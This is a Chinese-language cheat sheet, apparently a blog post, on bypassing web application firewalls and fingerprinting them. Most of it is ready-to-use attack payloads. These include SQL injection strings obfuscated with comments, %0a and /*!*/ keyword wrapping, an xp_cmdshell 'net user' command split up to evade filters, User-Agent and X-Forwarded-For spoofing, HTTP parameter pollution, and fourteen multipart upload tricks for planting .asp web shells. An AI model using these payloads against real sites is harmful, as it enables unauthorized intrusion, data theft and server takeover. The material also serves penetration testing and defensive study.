> 🎯 本文按「WAF 的检查机制 → 身份认证阶段的绕过 → 数据包解析阶段的绕过 → 触发规则的绕过 → 文件上传检测绕过 → WAF 识别与检测 → 指纹识别工具」的顺序，把 WAF 的检测流程和对应的绕过手法整理成一份速查清单。

## waf的检查机制

![image-20261001191335331](/assets/images/23/image-20261001191335331.png)

如果在白名单，放行，如果不在，那么查看是否在黑名单，如果在黑名单，那么拦截，如果也不在黑名单，那么进行数据包解析，如果解析之后和我们规则库里面保存的一些攻击规则匹配，比如含有or、and等，我觉得你是攻击请求，那么拦截，如果规则库没有匹配到，那么放行，所以绕过的最直接方式就是将攻击代码编码一下或者通过其他手段处理一下，让规则库不能检查出来即可。软硬件waf的防御方式大致都是这样的，还有个云waf，其实也是差不多的，但是云waf有个特点就是，如果你直接访问的是真实ip地址，那么云waf是不做防护的，直接绕过

> 💡 上面这张图的判断顺序可以理解成一串 `if` 判断，整理成表格更直观：

| 判断顺序 | 判断条件 | 处理结果 |
|---------|---------|---------|
| 1 | 在白名单 | 放行 |
| 2 | 在黑名单 | 拦截 |
| 3 | 数据包解析后匹配规则库（如含 `or`、`and`） | 认为是攻击请求 → 拦截 |
| 4 | 规则库没有匹配到 | 放行 |

> 🎯 所以绕过的最直接方式：**把攻击代码编码一下，或者通过其他手段处理一下**，让规则库不能检查出来即可。软硬件 waf 的防御方式大致都是这样的。

> ⚠️ 云 waf 也是差不多的，但有个特点：**如果你直接访问的是真实 ip 地址，那么云 waf 是不做防护的**，直接绕过。

## WAF身份认证阶段的绕过

在白名单内的客户请求将不做检测

### 绕过方法一：伪造搜索引擎

我在百度上搜东西，有一个搜索框，我把我要搜的东西写进去，例如网络安全，百度用爬虫去爬去符合的网安，这个过程叫收录，收录的时候百度回去访问这些网站，会携带上自己的特征的东西，叫user-agent.baiduspider，黑客也可以通过伪造这个搜索引擎去绕过白名单

Web服务基于User-Agent识别百度爬虫并设置访问白名单，若服务器仅校验UA字段，攻击者可伪造 Baiduspider 的UA，欺骗服务器，绕过访问限制

可以通burp来修改User-Agent

### 绕过方法二：伪造白名单特殊目录

属于waf管理员配置规则不当导致的。

360webscan脚本存在这个问题，就是判断是否为admin dede install等目录，如果是则不做拦截，也就是白名单设置的有问题，发现是 admin 开头的路径请求就直接放行了。

```
比如：www.spisec.com/pen/news.php?id=1 union select user,password from mysql.user

可以改为:
www.spisec.com/pen/news.php/admin?id=1 union select user,password from 
mysql.user
或者
www.spisec.com/pen/admin/..\news.php?id=1 union select user,password from 
mysql.user
其实仔细观察这句话的话`admin/..\`，这就是为了绕过而生的，看上去是一句废话，因为..\我们知道是访问上一层。
```

---

### 绕过方法三：直接攻击源站(真实ip地址)

像安全宝、加速乐这种云 WAF，工作流程是这样：
网站域名的 DNS 被改了，别人访问这个网站的时候，域名会解析到云 WAF 的服务器节点上。所有人的访问流量，先经过 WAF 过滤一遍，恶意攻击直接拦掉，正常流量才转发到网站真正的源服务器。
简单说：正常上网访问网站 → 先过 WAF（门卫）→ 再到网站真实服务器。

如果我们能通过一些手段（比如c段、社工）找到原始的服务器地址，便可以绕过。

## WAF数据包解析阶段的绕过

### 编码绕过

可以用base64编码

但是不好用，因为你提交的base64编码直接拼接到了url之后，然后由于http协议的特点，把+解析成空格

可以通过js的某个方法处理一下base64编码的数据，然后再发送

```
encodeURIComponent
JS内置函数，专门用来把参数值做URL编码，防止特殊符号破URL。
作用:
URL里面有一些特殊字符： + / = & ? #  等，不能直接塞到参数里。encodeURIComponent 会把这些符号转成  %XX  这种百分号编码格式。
```

或者我提前把base64编码先url编码在提交

### 修改请求方式绕过

有时候WAF对GET进行了过滤，但是Cookie甚至POST参数却没有检测。

```
例子：
访问  shturl.cc/njZNpGLS5d union select 
WAF拦截GET，匹配到union/select，直接拦
把参数挪到POST请求体，改成POST提交同样payload
```

```
POST /index.php HTTP/1.1
Host: shturl.
Content-Type: application/x-www-form-urlencoded

id=1 union select
```

### 请求数据位置绕过

请求数据包中很多参数如果没做处理，直接放在数据库中，就可能造成sql注入。有的没有回显的，我们可以利用盲注和报错注入带出数据。

### 复参数绕过

把提交的payload分成多个部分提交

```
例如一个请求是这样的
GET /pen/news.php?id=1 union select user,password from mysql.user

可以修改为
GET pen/news.php?id=1&id=union&id=select&id=user,password&id=from%20mysql.user
```

## WAF触发规则的绕过

WAF在这里主要是针对一些特殊的关键词或者用法进行检测。绕过方法很多，也是最有效的。

### 绕过策略一：特殊字符替换空格

用一些特殊字符代替空格，比如在mysql中%0a是换行，可以代替空格，这个方法也可以部分绕过最新版本的WAF，在sqlserver和mysql中都可以用/**/代替空格，也可以使用如下方法：

```
http://192.168.0.142:8080/sql.php?id=1/*|%23--%23|*/union/*|%23--%23|*/select/*|%23--%23|*/1,user(),3,4,5
http://192.168.0.142:8080/sql.php?id=1/*|%23--%23|*/and/*|%23--%23|*/1=2
%23 是#的url编码形式
把/*|%23--%23|*/当成空格使用
```

---

### 绕过策略二：特殊字符拼接

把特殊字符拼接起来绕过WAF的检测，通过+拼接，比如在Mysql中，可以利用注释/**/来绕过，在

mssql中，函数里面可以用+来拼接

mysql中，concat()可以用来拼接

```
如：GET /pen/news.php?id=1;exec(master..xp_cmdshell 'net user')
可以改为：GET /pen/news.php?id=1; exec('maste'+'r..xp'+'_cmdshell'+'"net user"')

如：?id=1' and updatexml(1,concat(0x7e,database(),0x7e),1)--+ 的报错注入
```

---

### 绕过策略三：注释包含关键字

在mysql中，可以利用/*!*/包含关键词进行绕过，在mysql中这个不是注释，而是取消注释的内容。测试最新版本的WAF可以完美绕过。

```
如: GET /pen/news.php?id=1 union select user,password from mysql.user
可以改为: GET /pen/news.php?id=1 /*!union*/ /*!select*/ user,password /*!from*/ mysql.user
```

---

### 绕过策略四（关键词插特殊符号变形)

MySQL 语法允许在关键字旁边插入 **~ ! @ # $ % ^这类符号 **，WAF 看到select~、select!，识别不到完整select就放行；MySQL 解析的时候会忽略这些多余符号，仍然当成 select 关键字执行。

```
也可以尝试select~ select~1 select! select@等绕过成功
```

### 空格替换法

把空格替换成 %0a 或 /**/ 可以绕过最新版本 WAF

```
?id=-1' union%0aselect%0a1,2,3--+
```

```
?id=-1' union/**/select/**/1,2,3--+
```

一起用

```
?id=-1' union%0a/**/select%0a/**/1,2,3--+
```

也可以这样
http://192.11.22.55/sqli/Less-1/?id=1' and /*!1=1*/ %23 (WAF不拦截)

### bypass waf插件

在发送数据包的时候会自动带上，可以实现绕过

```
X-Originating-IP: 127.0.0.1
X-Forwarded-For: 127.0.0.1  //伪造客户端 IP 为本地回环地址 127.0.0.1，让网站误以为：当前这个请求，是服务器本机发起的，不是外部浏览器来的。
X-Remote-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
X-Client-IP: 127.0.0.1
```

![image-20261002123334491](/assets/images/23/image-20261002123334491.png)

| 请求头                      | 作用                                                         |
| --------------------------- | ------------------------------------------------------------ |
| `X-Forwarded-For`（最常用） | 简称 XFF。记录**原始客户端 IP + 经过的所有代理 IP**，格式：`真实IP,代理1IP,代理2IP`。后端程序读这个头拿到访问者真实 IP。 |
| `X-Originating-IP`          | 起源 IP。部分代理 / 防火墙使用，存放最初发起请求的客户端 IP。 |
| `X-Remote-IP`               | 远程 IP，代理传递客户端源 IP。                               |
| `X-Remote-Addr`             | 和`REMOTE_ADDR`对应，把 TCP 源 IP 传给后端。`REMOTE_ADDR`是 web 服务器原生拿到的 TCP 连接 IP，**不可伪造**。 |
| `X-Client-IP`               | 客户端 IP，CDN / 代理常用，存放访问用户 IP。                 |

### HTTP 参数污染

PHP 中$_GET['参数名']遇到同名多个参数时，只取最后一个参数的值

核心绕过思路：
WAF 检测第一个参数，发现恶意 SQL 字符直接拦截；
但后端 PHP 读取最后一个同名参数执行 SQL。

```
?id=1&id=2&id=3
WAF 拿到完整串，PHP 的$_GET['id']读取最后 id=3，页面返回 id=3 数据

构造注入 payload：
?id=1&id=2&id=3'
WAF：读取第一个id=1，无恶意内容，放行
PHP 后端：读取最后id=3'，单引号触发 SQL 报错注入，WAF 没检测到后面的恶意 payload

多个同名参数，WAF 读前面，PHP 读末尾；把恶意 payload 放最后，前面放无害值，绕 WAF。
```

## waf文件上传检测方法

1、文件名前缀加[0x09]绕过：

```
——WebKitFormBoundary2smpsxFB3D0KbA7D
Content-Disposition: form-data; name=”filepath”; filename=”[0x09]backlion.asp”
Content-Type: text/html
```

2、文件名去掉双引号绕过：

```
——WebKitFormBoundary2smpsxFB3D0KbA7D
Content-Disposition: form-data; name=”filepath”; filename=backlion.asp
Content-Type: text/html
```

3、添加一个filename1的文件名参数，并赋值绕过：  

原理：
Content-Disposition 里写多个 filename 类参数，部分老旧上传代码只取第一个 filename做后缀校验，但保存文件时取filename1** 的值;或者后端正则只匹配第一个文件名，保存用第二个，实现后缀绕过。

```
——WebKitFormBoundary2smpsxFB3D0KbA7D
Content-Disposition: form-data; name=”filepath”; filename=”
backlion.asp”;filename1=”test.jpg”
Content-Type: text/html
```

4、form变量改成f+orm组合绕过：

```
——WebKitFormBoundary2smpsxFB3D0KbA7D
Content-Disposition: f+orm-data; name=”filepath”;filename=”backlion.asp”
Content-Type: text/html
```

5、文件名后缀大小写绕过：

```
——WebKitFormBoundary2smpsxFB3D0KbA7D
ConTent-Disposition: form-data; name=”filepath”; filename=”backlion.Asp”
Content-Type: text/html
```

6、去掉form-data变量绕过：

```
——WebKitFormBoundary2smpsxFB3D0KbA7D
ConTent-Disposition: name=”filepath”; filename=”backlion.asp”
Content-Type: text/html
```

 7、在Content-Disposition:后添加多个空格 或者在form-data;后添加多个空格绕过：

```
——WebKitFormBoundary2smpsxFB3D0KbA7D
ConTent-Disposition: form-data                                 ; name=”filepath”; 
filename=”backlion.asp”
Content-Type: text/html
```

或者

```
——WebKitFormBoundary2smpsxFB3D0KbA7D
ConTent-Disposition:                                                                 
                  form-data ; name=”filepath”; filename=”baclion.asp”
Content-Type: text/html
```

8、backlion.asp空格. 绕过：

原理：Windows NTFS 保存文件时，自动剔除文件名末尾的空格与点。

```
——WebKitFormBoundary2smpsxFB3D0KbA7D
ConTent-Disposition: form-data; name=”filepath”; filename=”backlion.asp .”
Content-Type: text/html
```

9、“回车换行，绕过：

不能直接在 Burp Raw 文本框敲回车！必须切 Hex 面板插入 0D 0A（\r\n）

```
——WebKitFormBoundary2smpsxFB3D0KbA7D
ConTent-Disposition: form-data; name=”filepath”; filename=”backlion.asp
”
Content-Type: text/html
```

10、NTFS流 在文件名后加::$DATA绕过：

原理：后端黑名单校验拿到文件名 `backlion.asp::$DATA`，部分代码取后缀识别为`::$DATA`放行；写入磁盘时 Windows 自动忽略`::$DATA`，实际落地文件为 backlion.asp，IIS 可解析执行

```
——WebKitFormBoundary2smpsxFB3D0KbA7D
ConTent-Disposition: form-data; name=”filepath”; filename=”backlion.asp::$DATA”
Content-Type: text/html
```

或者

```
——WebKitFormBoundary2smpsxFB3D0KbA7D
ConTent-Disposition: form-data; name=”filepath”; filename=”
backlion.asp::$DATA\0x00\fuck.asp0x00.jpg”
Content-Type: text/html
```

11、将Content-Type和ConTent-Disposition调换顺序位置绕过：

```
——WebKitFormBoundary2smpsxFB3D0KbA7D
Content-Type: text/html
ConTent-Disposition: form-data; name=”filepath”; filename=”backlion.asp”
```

12、突破12，在文件名前缀加空格（tab键可替换）绕过：

```
——WebKitFormBoundary2smpsxFB3D0KbA7D
Content-Disposition: form-data; name=”filepath”; filename=   “backlion.asp”
Content-Type: text/html
```

13、在form-data加空格绕过：

```
——WebKitFormBoundary2smpsxFB3D0KbA7D
Content-Disposition: form-data;     name=”uploaded”; filename=”backlion.asp”
Content-Type: text/html
```

14、在form-data的前后加上+绕过：

```
——WebKitFormBoundary2smpsxFB3D0KbA7D
Content-Disposition: +form-data; name=”filepath”; filename=”backlion.asp”
Content-Type: text/html
```

或者

```
——WebKitFormBoundary2smpsxFB3D0KbA7D
Content-Disposition: form-data+; name=”filepath”; filename=”backlion.asp”
Content-Type: text/html
```

| 序号 | 手法 | 变形点 |
|------|------|--------|
| 1 | 文件名前缀加 `[0x09]` | 文件名 |
| 2 | 文件名去掉双引号 | 文件名 |
| 3 | 添加 `filename1` 参数并赋值 | 文件名参数 |
| 4 | `form` 改成 `f+orm` | 头部变量名 |
| 5 | 文件名后缀大小写（`backlion.Asp`） | 文件名 |
| 6 | 去掉 `form-data` 变量 | 头部变量名 |
| 7 | `Content-Disposition:` 后 / `form-data;` 后加多个空格 | 空白字符 |
| 8 | `backlion.asp空格.`（NTFS 剔除末尾空格与点） | Windows 特性 |
| 9 | 文件名中插入回车换行（Hex 面板插 `0D 0A`） | 空白字符 |
| 10 | 文件名后加 `::$DATA`（NTFS 流） | Windows 特性 |
| 11 | 调换 `Content-Type` 和 `ConTent-Disposition` 顺序 | 头部顺序 |
| 12 | 文件名前缀加空格（tab 键可替换） | 空白字符 |
| 13 | `form-data` 后加空格 | 空白字符 |
| 14 | `form-data` 前后加 `+` | 头部变量名 |

## waf识别

**核心原理**：WAF 作为反向代理 / 前置防护节点，会在响应头、Cookie、响应 Body、状态码、异常返回内容、指纹化乱码中留下专属特征，可用于精准识别。

### 自定义 Cookie 指纹识别

**原理**：WAF 主动下发 Cookie，用于会话校验、JS 挑战、人机验证、流量标记，不属于后端业务 Web 服务生成。

#### Citrix NetScaler

- Cookie：`NSC_xxx`（典型：`NSC_TM`、`NSC_AA`）
- 特征：Cookie 值为长串 Base64 / 加密串，伴随 Header 随机混淆

#### 云锁 Yunsuo WAF

- Cookie：`yunsuo_session`
- 附加特征：请求常触发 JS 验证页面

#### 安全狗 Safedog

- Cookie：`safedog-flow-item`
- 衍生指纹：部分版本存在 `__sd__id`，用于流量计数、恶意 IP 标记

**判断技巧**：首次无 Cookie 发起 GET 请求，响应头 Set-Cookie 出现以上字段，且业务本身不会生成该 Cookie，即可判定存在 WAF。

---

### 响应 Header 专属标识识别

**原理**：部分 WAF 会直接在响应头植入专属字段，识别成本最低、最直观。

#### 安恒 Anquanbao WAF

- 专属请求头：`X-Anquanbao`

#### AWS WAF（Amazon）

- 专属请求头：`X-Amzn-WAF`
- 辅助特征：拦截页面自带 `x-amzn-trace-id`，拦截状态码多为 403

**快速探测方式**：`curl -I 目标地址`，仅获取响应头快速匹配指纹。

---

### Header 动态混淆干扰识别

**原理**：硬件型 WAF 动态修改 Header 名称、顺序、大小写、填充随机值，干扰自动化指纹识别工具。

#### F5 Big-IP

- 经典特征：`X-Cnection`（Connection 专属拼写错误指纹）、`X-BigIP`
- 行为特征：多次相同请求，Header 顺序随机变动

#### Citrix NetScaler

- 行为特征：每次请求新增随机名称 Header，部分 Header 值为随机乱码

**识别思路**：重复发送多次相同请求，对比响应 Header，若名称、数值、顺序持续随机变化，大概率为 F5 / NetScaler 硬件 WAF。

---

### Server 头直显 WAF 名称

**原理**：WAF 覆盖后端 Web 服务的 Server 响应头，直接暴露自身名称。

- Approach WAF：`Server: Approach`
- WTS WAF：`Server: WTS`

**注意事项**：WAF 支持自定义伪装 Server 头，无该特征不代表无 WAF，仅作辅助判定依据。

---

### 响应 Body 页面指纹识别

**原理**：常规响应头无特征，触发恶意拦截后，拦截页面 HTML 源码包含 WAF 专属关键字。

- DotDefender：拦截页面包含 `DotDefender` 关键字
- Armor：拦截页面展示 `Armor` 字样
- Sitelock：页面源码包含`sitelock` 字段

**探测方式**：构造恶意 payload `?x=<script>` 触发拦截，查看页面源码匹配特征。

---

### 特殊拦截状态码识别

**原理**：正常业务请求状态码多为 200/404，WAF 拦截恶意请求会返回专属异常状态码。

- WebKnight WAF：专属拦截码 `419`
- 360 WAF：主流拦截码 `403`，特殊场景返回 405/503，搭配专属拦截页面

**注意事项**：403 为通用状态码，不可单独作为判定依据，需结合 Header、Cookie、页面内容综合判断。

---

### 垃圾乱码数据特征识别

**适用对象**：百度云加速乐

**核心特征**：正常业务请求返回 200 正常页面，携带攻击 payload 时，返回大量无意义二进制乱码、随机垃圾字符，无标准 HTML 拦截页面结构。

---
